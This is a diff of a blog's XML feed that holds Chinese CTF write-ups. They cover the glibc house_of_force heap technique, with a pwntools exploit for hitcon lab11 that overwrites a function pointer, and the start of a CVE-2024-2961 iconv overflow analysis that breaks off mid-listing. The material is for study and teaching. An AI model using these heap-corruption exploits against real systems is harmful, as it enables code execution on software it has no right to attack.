class="comment">/* Same, except also perform an argument and result check.  First, we check</span></span><br><span class="line"><span class="comment">   that the padding done by request2size didn&#x27;t result in an integer</span></span><br><span class="line"><span class="comment">   overflow.  Then we check (using REQUEST_OUT_OF_RANGE) that the resulting</span></span><br><span class="line"><span class="comment">   size isn&#x27;t so large that a later alignment would lead to another integer</span></span><br><span class="line"><span class="comment">   overflow.  */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> checked_request2size(req, sz) \</span></span><br><span class="line"><span class="meta">(&#123;				    \</span></span><br><span class="line"><span class="meta">  (sz) = request2size (req);	    \</span></span><br><span class="line"><span class="meta">  <span class="keyword">if</span> (((sz) &lt; (req))		    \			<span class="comment">//调整后的sz一定要比传入的bytes要大</span></span></span><br><span class="line">      || <span class="built_in">REQUEST_OUT_OF_RANGE</span> (sz)) \		<span class="comment">//一般都会满足，申请的大小不要太大就行</span></span><br><span class="line">    &#123;				    \</span><br><span class="line">      __set_errno (ENOMEM);	    \</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;			    \</span><br><span class="line">    &#125;				    \</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></div>
-
-<p>这里我们如果申请一个大小为负数的chunk，实际上nb经request2size处理后是一个非常大的正数，但加上一定值后溢出，也就实现了正常的正数与负数的运算。我们的topchunk实际上会向低地址处偏移。需要注意的是，申请一个大小为负数的chunk时，这个负数会被unsigned int转换成一个非常大的数。这时如果我们这个转换后的数的大小大于我们修改的top chunk的size，<code>malloc</code> 将尝试扩展堆空间，这时候就会调用 <code>sysmalloc</code>，其中就会报错退出。所我们一般直接把top chunk的size改成-1，也就是0xffffffffffffffff。基本就可以通过所有检测。</p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/blog/2024/10/03/house-of-force/image-20241003002907725.png"
-                      class=""
-                >
-
-<p>由于我们要精准控制申请后的大小来使top chunk落在想要的位置，也就是要控制request2size(req)的值</p>
-<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> MALLOC_ALIGNMENT_MASK (MALLOC_ALIGNMENT - 1)	<span class="comment">//32位系统上通常为0x7,64位上为0xf</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SIZE_SZ (sizeof(size_t))		<span class="comment">//32位系统上通常为4,64位上为8</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MINSIZE  \</span></span><br><span class="line"><span class="meta">  (unsigned long)(((MIN_CHUNK_SIZE+MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MIN_CHUNK_SIZE        (offsetof(struct malloc_chunk, fd_nextsize))	<span class="comment">//0x20</span></span></span><br><span class="line"></span><br><span class="line">(((req) + SIZE_SZ + MALLOC_ALIGN_MASK &lt; MINSIZE)  ?             \</span><br><span class="line">   MINSIZE :                                                      \</span><br><span class="line">   ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK)</span><br></pre></td></tr></table></figure></div>
-
-<p>由于<code>(req) + SIZE_SZ + MALLOC_ALIGN_MASK</code>一般都会大于MINSIZE，所以我们就要使我们输入req为<code>target_offset - SIZE_SZ - MALLOC_ALIGN_MASK</code>，这样我们只要target_add是关于16字节对齐的，那么最后申请出chunk就会使top_chunk偏移到我们想要的地址处。</p>
-<h4 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h4><h5 id="hitcontraning-lab11"><a href="#hitcontraning-lab11" class="headerlink" title="hitcontraning_lab11"></a>hitcontraning_lab11</h5><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/blog/2024/10/03/house-of-force/image-20241003002919869.png"
-                      class=""
-                >
-
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/blog/2024/10/03/house-of-force/image-20241003002937355.png"
-                      class=""
-                >
-
-
-
-<p>我们可以发现有对v4中函数指针的调用，而v4是一个指向堆的指针，那么我们就可以想办法改掉其中的函数指针实现任意地址的跳转，而程序中又有magic后门函数，所以思路就是改位于v4+8位置处的函数指针为magic，最后再传入5来调用magic。</p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/blog/2024/10/03/house-of-force/image-20241003002948587.png"
-                      class=""
-                >
-
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/blog/2024/10/03/house-of-force/image-20241003002955916.png"
-                      class=""
-                >
-
-
-
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/blog/2024/10/03/house-of-force/image-20241003003131870.png"
-                      class=""
-                >
-
-
-
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/blog/2024/10/03/house-of-force/image-20241003003143107.png"
-                      class=""
-                >
-
-<p>可以发现change_item方法中我们可以任意控制输入大小，从而造成堆溢出，这里其实也可以用overlapping来构造double free，不过显然house_of_force更快更方便。</p>
-<p>先把板子套上：</p>
-<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice:&quot;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Please enter the length of item name:&quot;</span>,<span class="built_in">str</span>(size).encode())</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Please enter the name of item:&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice:&quot;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,size,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice:&quot;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Please enter the index of item:&quot;</span>,<span class="built_in">str</span>(idx).encode())</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Please enter the length of item name:&quot;</span>,<span class="built_in">str</span>(size).encode())</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Please enter the new name of the item:&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice:&quot;</span>,<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Please enter the index of item:&quot;</span>,<span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">end</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice:&quot;</span>,<span class="string">&#x27;5&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
-
-<p>具体打法：</p>
-<p>首先溢出改top chunk的size域</p>
-<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">magic = <span class="number">0x0000000000400D49</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x30</span>,<span class="string">b&quot;AAAA&quot;</span>)   <span class="comment">#0</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x40</span>,<span class="string">b&quot;A&quot;</span>*<span class="number">0x38</span>+p64(<span class="number">0xfffffffffffffff1</span>))</span><br></pre></td></tr></table></figure></div>
-
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/blog/2024/10/03/house-of-force/image-20241003003151793.png"
-                      class=""
-                >
-
-<p>然后算出偏移后申请一个目标大小的chunk</p>
-<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">off = -<span class="number">0x60</span> - <span class="number">0x8</span> - <span class="number">0xf</span></span><br><span class="line">add(off,<span class="string">b&quot;AAAA&quot;</span>)    <span class="comment">#1</span></span><br></pre></td></tr></table></figure></div>
-
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/blog/2024/10/03/house-of-force/image-20241003003155240.png"
-                      class=""
-                >
-
-<p>此时我们发现top chunk已经到了目标位置处，再申请一个chunk就可以改写目标位置函数指针了。</p>
-<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0x10</span>,p64(magic)*<span class="number">2</span>)</span><br><span class="line">end()</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>
-
-]]></content>
-      <categories>
-        <category>pwn</category>
-      </categories>
-      <tags>
-        <tag>pwn</tag>
-        <tag>heap</tag>
-        <tag>house of</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>house_of_apple2利用手法浅析</title>
     <url>/blog/2024/11/10/house-of-apple2%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95%E6%B5%85%E6%9E%90/</url>
     <content><![CDATA[<h2 id="house-of-apple2"><a href="#house-of-apple2" class="headerlink" title="house of apple2"></a>house of apple2</h2><h4 id="适用版本"><a href="#适用版本" class="headerlink" title="适用版本"></a>适用版本</h4><ul>
@@ -935,6 +682,259 @@
         <tag>pwn</tag>
         <tag>heap</tag>
         <tag>house of</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>house_of_force</title>
+    <url>/blog/2024/10/03/house-of-force/</url>
+    <content><![CDATA[<h2 id="house-of-force"><a href="#house-of-force" class="headerlink" title="house_of_force"></a>house_of_force</h2><h4 id="适用版本"><a href="#适用版本" class="headerlink" title="适用版本"></a>适用版本</h4><p>glibc2.23 - 2.29</p>
+<h4 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h4><ul>
+<li>能控制top chunk的size域</li>
+<li>能获取heap_base，进而计算出top_chunk的地址</li>
+<li>能自由控制堆分配尺寸大小</li>
+</ul>
+<h4 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h4><ul>
+<li><p>将top chunk的size改得很大，使后续能够分配很大的堆块，从而使topchunk指向目标地址。</p>
+</li>
+<li><p>精准计算top chunk的地址与target addr-0x10之间偏移，再进行细微的调整，使申请完一个chunk后，top chunk的data域直接位于target addr处。</p>
+</li>
+<li><p>再申请一个chunk，往目标地址处写入值。</p>
+</li>
+</ul>
+<h4 id="实现目的"><a href="#实现目的" class="headerlink" title="实现目的"></a>实现目的</h4><p>任意地址写</p>
+<h4 id="利用原理"><a href="#利用原理" class="headerlink" title="利用原理"></a>利用原理</h4><p>2.27glibc top chunk分配源代码如下</p>
+<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line">victim = av-&gt;top;</span><br><span class="line">size = <span class="built_in">chunksize</span> (victim);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (size) &gt;= (<span class="type">unsigned</span> <span class="type">long</span>) (nb + MINSIZE))</span><br><span class="line">&#123;</span><br><span class="line">  remainder_size = size - nb;			<span class="comment">//分配后剩下的大小</span></span><br><span class="line">  remainder = <span class="built_in">chunk_at_offset</span> (victim, nb);		<span class="comment">//剩下的chunk</span></span><br><span class="line">  av-&gt;top = remainder;							<span class="comment">//更新top chunk</span></span><br><span class="line">  <span class="built_in">set_head</span> (victim, nb | PREV_INUSE |			<span class="comment">//设置从原topchunk分配出的chunk的头部</span></span><br><span class="line">            (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">  <span class="built_in">set_head</span> (remainder, remainder_size | PREV_INUSE);	<span class="comment">//设置新的top chunk的头部</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">check_malloced_chunk</span> (av, victim, nb);</span><br><span class="line">  <span class="type">void</span> *p = <span class="built_in">chunk2mem</span> (victim);</span><br><span class="line">  <span class="built_in">alloc_perturb</span> (p, bytes);</span><br><span class="line">  <span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>其中nb定义在<code>checked_request2size (bytes, nb);</code>,这个宏内部定义了nb的值（也就是sz）。<code>_int_malloc (mstate av, size_t bytes)</code>，bytes是该函数的参数，也就是我们调用malloc函数时传进去的数字。<code>nb</code> 实质上是用来存储经过调整后的内存请求大小的变量。</p>
+<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> REQUEST_OUT_OF_RANGE(req)                                 \</span></span><br><span class="line"><span class="meta">  ((unsigned long) (req) &gt;=						      \</span></span><br><span class="line"><span class="meta">   (unsigned long) (INTERNAL_SIZE_T) (-2 * MINSIZE))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* pad request bytes into a usable size -- internal version */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> request2size(req)                                         \</span></span><br><span class="line"><span class="meta">  (((req) + SIZE_SZ + MALLOC_ALIGN_MASK &lt; MINSIZE)  ?             \</span></span><br><span class="line"><span class="meta">   MINSIZE :                                                      \</span></span><br><span class="line"><span class="meta">   ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Same, except also perform an argument and result check.  First, we check</span></span><br><span class="line"><span class="comment">   that the padding done by request2size didn&#x27;t result in an integer</span></span><br><span class="line"><span class="comment">   overflow.  Then we check (using REQUEST_OUT_OF_RANGE) that the resulting</span></span><br><span class="line"><span class="comment">   size isn&#x27;t so large that a later alignment would lead to another integer</span></span><br><span class="line"><span class="comment">   overflow.  */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> checked_request2size(req, sz) \</span></span><br><span class="line"><span class="meta">(&#123;				    \</span></span><br><span class="line"><span class="meta">  (sz) = request2size (req);	    \</span></span><br><span class="line"><span class="meta">  <span class="keyword">if</span> (((sz) &lt; (req))		    \			<span class="comment">//调整后的sz一定要比传入的bytes要大</span></span></span><br><span class="line">      || <span class="built_in">REQUEST_OUT_OF_RANGE</span> (sz)) \		<span class="comment">//一般都会满足，申请的大小不要太大就行</span></span><br><span class="line">    &#123;				    \</span><br><span class="line">      __set_errno (ENOMEM);	    \</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;			    \</span><br><span class="line">    &#125;				    \</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></div>
+
+<p>这里我们如果申请一个大小为负数的chunk，实际上nb经request2size处理后是一个非常大的正数，但加上一定值后溢出，也就实现了正常的正数与负数的运算。我们的topchunk实际上会向低地址处偏移。需要注意的是，申请一个大小为负数的chunk时，这个负数会被unsigned int转换成一个非常大的数。这时如果我们这个转换后的数的大小大于我们修改的top chunk的size，<code>malloc</code> 将尝试扩展堆空间，这时候就会调用 <code>sysmalloc</code>，其中就会报错退出。所我们一般直接把top chunk的size改成-1，也就是0xffffffffffffffff。基本就可以通过所有检测。</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/blog/2024/10/03/house-of-force/image-20241003002907725.png"
+                      class=""
+                >
+
+<p>由于我们要精准控制申请后的大小来使top chunk落在想要的位置，也就是要控制request2size(req)的值</p>
+<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> MALLOC_ALIGNMENT_MASK (MALLOC_ALIGNMENT - 1)	<span class="comment">//32位系统上通常为0x7,64位上为0xf</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SIZE_SZ (sizeof(size_t))		<span class="comment">//32位系统上通常为4,64位上为8</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MINSIZE  \</span></span><br><span class="line"><span class="meta">  (unsigned long)(((MIN_CHUNK_SIZE+MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MIN_CHUNK_SIZE        (offsetof(struct malloc_chunk, fd_nextsize))	<span class="comment">//0x20</span></span></span><br><span class="line"></span><br><span class="line">(((req) + SIZE_SZ + MALLOC_ALIGN_MASK &lt; MINSIZE)  ?             \</span><br><span class="line">   MINSIZE :                                                      \</span><br><span class="line">   ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK)</span><br></pre></td></tr></table></figure></div>
+
+<p>由于<code>(req) + SIZE_SZ + MALLOC_ALIGN_MASK</code>一般都会大于MINSIZE，所以我们就要使我们输入req为<code>target_offset - SIZE_SZ - MALLOC_ALIGN_MASK</code>，这样我们只要target_add是关于16字节对齐的，那么最后申请出chunk就会使top_chunk偏移到我们想要的地址处。</p>
+<h4 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h4><h5 id="hitcontraning-lab11"><a href="#hitcontraning-lab11" class="headerlink" title="hitcontraning_lab11"></a>hitcontraning_lab11</h5><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/blog/2024/10/03/house-of-force/image-20241003002919869.png"
+                      class=""
+                >
+
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/blog/2024/10/03/house-of-force/image-20241003002937355.png"
+                      class=""
+                >
+
+
+
+<p>我们可以发现有对v4中函数指针的调用，而v4是一个指向堆的指针，那么我们就可以想办法改掉其中的函数指针实现任意地址的跳转，而程序中又有magic后门函数，所以思路就是改位于v4+8位置处的函数指针为magic，最后再传入5来调用magic。</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/blog/2024/10/03/house-of-force/image-20241003002948587.png"
+                      class=""
+                >
+
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/blog/2024/10/03/house-of-force/image-20241003002955916.png"
+                      class=""
+                >
+
+
+
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/blog/2024/10/03/house-of-force/image-20241003003131870.png"
+                      class=""
+                >
+
+
+
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/blog/2024/10/03/house-of-force/image-20241003003143107.png"
+                      class=""
+                >
+
+<p>可以发现change_item方法中我们可以任意控制输入大小，从而造成堆溢出，这里其实也可以用overlapping来构造double free，不过显然house_of_force更快更方便。</p>
+<p>先把板子套上：</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice:&quot;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Please enter the length of item name:&quot;</span>,<span class="built_in">str</span>(size).encode())</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Please enter the name of item:&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice:&quot;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,size,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice:&quot;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Please enter the index of item:&quot;</span>,<span class="built_in">str</span>(idx).encode())</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Please enter the length of item name:&quot;</span>,<span class="built_in">str</span>(size).encode())</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Please enter the new name of the item:&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice:&quot;</span>,<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Please enter the index of item:&quot;</span>,<span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">end</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice:&quot;</span>,<span class="string">&#x27;5&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p>具体打法：</p>
+<p>首先溢出改top chunk的size域</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">magic = <span class="number">0x0000000000400D49</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x30</span>,<span class="string">b&quot;AAAA&quot;</span>)   <span class="comment">#0</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x40</span>,<span class="string">b&quot;A&quot;</span>*<span class="number">0x38</span>+p64(<span class="number">0xfffffffffffffff1</span>))</span><br></pre></td></tr></table></figure></div>
+
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/blog/2024/10/03/house-of-force/image-20241003003151793.png"
+                      class=""
+                >
+
+<p>然后算出偏移后申请一个目标大小的chunk</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">off = -<span class="number">0x60</span> - <span class="number">0x8</span> - <span class="number">0xf</span></span><br><span class="line">add(off,<span class="string">b&quot;AAAA&quot;</span>)    <span class="comment">#1</span></span><br></pre></td></tr></table></figure></div>
+
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/blog/2024/10/03/house-of-force/image-20241003003155240.png"
+                      class=""
+                >
+
+<p>此时我们发现top chunk已经到了目标位置处，再申请一个chunk就可以改写目标位置函数指针了。</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0x10</span>,p64(magic)*<span class="number">2</span>)</span><br><span class="line">end()</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>
+
+]]></content>
+      <categories>
+        <category>pwn</category>
+      </categories>
+      <tags>
+        <tag>pwn</tag>
+        <tag>heap</tag>
+        <tag>house of</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>CVE-2024-2961</title>
+    <url>/blog/2024/09/21/CVE-2024-2961/</url>
+    <content><![CDATA[<h2 id="iconv-cve-2024-2961"><a href="#iconv-cve-2024-2961" class="headerlink" title="iconv-cve-2024-2961"></a>iconv-cve-2024-2961</h2><h4 id="一、利用目的"><a href="#一、利用目的" class="headerlink" title="一、利用目的"></a>一、利用目的</h4><p>在二进制程序调用iconv这个glibc函数时，或是在PHP从一个字符集转换到另一个字符集调用iconv这个API时，其中当编码转换为ISO-2022-CN-EXT时，iconv有可能会产生缓冲区溢出</p>
+<h4 id="二、利用方式"><a href="#二、利用方式" class="headerlink" title="二、利用方式"></a>二、利用方式</h4><p>以从UTF-8转义到ISO-2022-CN-EXT为例。要触发此漏洞，我们需要迫使iconv()在输出缓冲区结束前发出一个转义序列。为此，我们可以使用诸如“劄”、“䂚”、“峛“等特殊字符。这将导致1到3字节的溢出，其溢出内容如下：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">字符 |		溢出内容		|		原UTF-8表示</span><br><span class="line">劄  		$*H [24 2A 48]      	  \xe5\x8a\x84</span><br><span class="line">䂚  		$+J [24 2B 4A]			  \xe4\x82\x9a</span><br><span class="line">峛  		$*H [24 2A 48]			  \xe5\xb3\x9b</span><br></pre></td></tr></table></figure></div>
+
+<h4 id="三、漏洞原理"><a href="#三、漏洞原理" class="headerlink" title="三、漏洞原理"></a>三、漏洞原理</h4><p>先贴一张2.27libc中的漏洞点关键代码，具体可在pathToYourLibc&#x2F;iconvdata&#x2F;iso-2022-cn-ext.c中查看</p>
+<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> ESC	0x1b</span></span><br><span class="line"><span class="class"><span class="keyword">enum</span>&#123;</span></span><br><span class="line">    ASCII_set = <span class="number">0</span>,</span><br><span class="line">  	GB2312_set,		<span class="comment">//1</span></span><br><span class="line">  	GB12345_set,	<span class="comment">//2</span></span><br><span class="line">  	CNS11643_1_set,	<span class="comment">//3</span></span><br><span class="line">  	ISO_IR_165_set,	<span class="comment">//4</span></span><br><span class="line">  	SO_mask = <span class="number">7</span>,</span><br><span class="line"></span><br><span class="line">  	GB7589_set = <span class="number">1</span> &lt;&lt; <span class="number">3</span>,</span><br><span class="line">  	GB13131_set = <span class="number">2</span> &lt;&lt; <span class="number">3</span>,</span><br><span class="line">  	CNS11643_2_set = <span class="number">3</span> &lt;&lt; <span class="number">3</span>,</span><br><span class="line">  	SS2_mask = <span class="number">3</span> &lt;&lt; <span class="number">3</span>,</span><br><span class="line"></span><br><span class="line">  	GB7590_set = <span class="number">1</span> &lt;&lt; <span class="number">5</span>,</span><br><span class="line">  	GB13132_set = <span class="number">2</span> &lt;&lt; <span class="number">5</span>,</span><br><span class="line">  	CNS11643_3_set = <span class="number">3</span> &lt;&lt; <span class="number">5</span>,</span><br><span class="line">  	CNS11643_4_set = <span class="number">4</span> &lt;&lt; <span class="number">5</span>,</span><br><span class="line">  	CNS11643_5_set = <span class="number">5</span> &lt;&lt; <span class="number">5</span>,</span><br><span class="line">  	CNS11643_6_set = <span class="number">6</span> &lt;&lt; <span class="number">5</span>,</span><br><span class="line">  	CNS11643_7_set = <span class="number">7</span> &lt;&lt; <span class="number">5</span>,</span><br><span class="line">  	SS3_mask = <span class="number">7</span> &lt;&lt; <span class="number">5</span>,</span><br><span class="line">&#125;</span><br><span class="line">...........................................................</span><br><span class="line"><span class="comment">/* See whether we have to emit an escape sequence.  */</span>		      </span><br><span class="line">	<span class="keyword">if</span> (<span class="built_in">set</span> != used)						      </span><br><span class="line">	  &#123;								      </span><br><span class="line">	    <span class="comment">/* First see whether we announced that we use this		      </span></span><br><span class="line"><span class="comment">	       character set.  */</span>					      </span><br><span class="line">	    <span class="keyword">if</span> ((used &amp; SO_mask) != <span class="number">0</span> &amp;&amp; (ann &amp; SO_ann) != (used &lt;&lt; <span class="number">8</span>))	      </span><br><span class="line">	      &#123;								      </span><br><span class="line">		<span class="type">const</span> <span class="type">char</span> *escseq;					      </span><br><span class="line">									      </span><br><span class="line">		<span class="keyword">if</span> (outptr + <span class="number">4</span> &gt; outend)				      </span><br><span class="line">		  &#123;							      </span><br><span class="line">		    result = __GCONV_FULL_OUTPUT;			      </span><br><span class="line">		    <span class="keyword">break</span>;						      </span><br><span class="line">		  &#125;							      </span><br><span class="line">									      </span><br><span class="line">		assert (used &gt;= <span class="number">1</span> &amp;&amp; used &lt;= <span class="number">4</span>);			      </span><br><span class="line">		escseq = <span class="string">&quot;)A\0\0)G)E&quot;</span> + (used - <span class="number">1</span>) * <span class="number">2</span>;			      </span><br><span class="line">		*outptr++ = ESC;					      </span><br><span class="line">		*outptr++ = <span class="string">&#x27;$&#x27;</span>;					      </span><br><span class="line">		*outptr++ = *escseq++;					      </span><br><span class="line">		*outptr++ = *escseq++;					      </span><br><span class="line">									      </span><br><span class="line">		ann = (ann &amp; ~SO_ann) | (used &lt;&lt; <span class="number">8</span>);			      </span><br><span class="line">	      &#125;								      </span><br><span class="line">	    <span class="keyword">else</span> <span class="keyword">if</span> ((used &amp; SS2_mask) != <span class="number">0</span> &amp;&amp; (ann &amp; SS2_ann) != (used &lt;&lt; <span class="number">8</span>))</span><br><span class="line">	      &#123;								      </span><br><span class="line">		<span class="type">const</span> <span class="type">char</span> *escseq;					      </span><br><span class="line">									      </span><br><span class="line">		assert (used == CNS11643_2_set); <span class="comment">/* XXX */</span>		      </span><br><span class="line">		escseq = <span class="string">&quot;*H&quot;</span>;						      </span><br><span class="line">		*outptr++ = ESC;					      </span><br><span class="line">		*outptr++ = <span class="string">&#x27;$&#x27;</span>;					      </span><br><span class="line">		*outptr++ = *escseq++;					      </span><br><span class="line">		*outptr++ = *escseq++;					      </span><br><span class="line">									      </span><br><span class="line">		ann = (ann &amp; ~SS2_ann) | (used &lt;&lt; <span class="number">8</span>);			      </span><br><span class="line">	      &#125;								      </span><br><span class="line">	    <span class="keyword">else</span> <span class="keyword">if</span> ((used &amp; SS3_mask) != <span class="number">0</span> &amp;&amp; (ann &amp; SS3_ann) != (used &lt;&lt; <span class="number">8</span>))</span><br><span class="line">	      &#123;								      </span><br><span class="line">		<span class="type">const</span> <span class="type">char</span> *escseq;					      </span><br><span class="line">									      </span><br><span class="line">		assert ((used &gt;&gt; <span class="number">5</span>) &gt;= <span class="number">3</span> &amp;&amp; (used &gt;&gt; <span class="number">5</span>) &lt;= <span class="number">7</span>);		      </span><br><span class="line">		escseq = <span class="string">&quot;+I+J+K+L+M&quot;</span> + ((used &gt;&gt; <span class="number">5</span>) - <span class="number">3</span>) * <span class="number">2</span>;		      </span><br><span class="line">		*outptr++ = ESC;					      </span><br><span class="line">		*outptr++ = <span class="string">&#x27;$&#x27;</span>;					      </span><br><span class="line">		*outptr++ = *escseq++;					      </span><br><span class="line">		*outptr++ = *escseq++;					      </span><br><span class="line">									      </span><br><span class="line">		ann = (ann &amp; ~SS3_ann) | (used &lt;&lt; <span class="number">8</span>);			      </span><br><span class="line">	      &#125;								      </span><br><span class="line">									      </span><br><span class="line">	    <span class="keyword">if</span> (used == CNS11643_2_set)					      </span><br><span class="line">	      &#123;								      </span><br><span class="line">		<span class="keyword">if</span> (outptr + <span class="number">2</span> 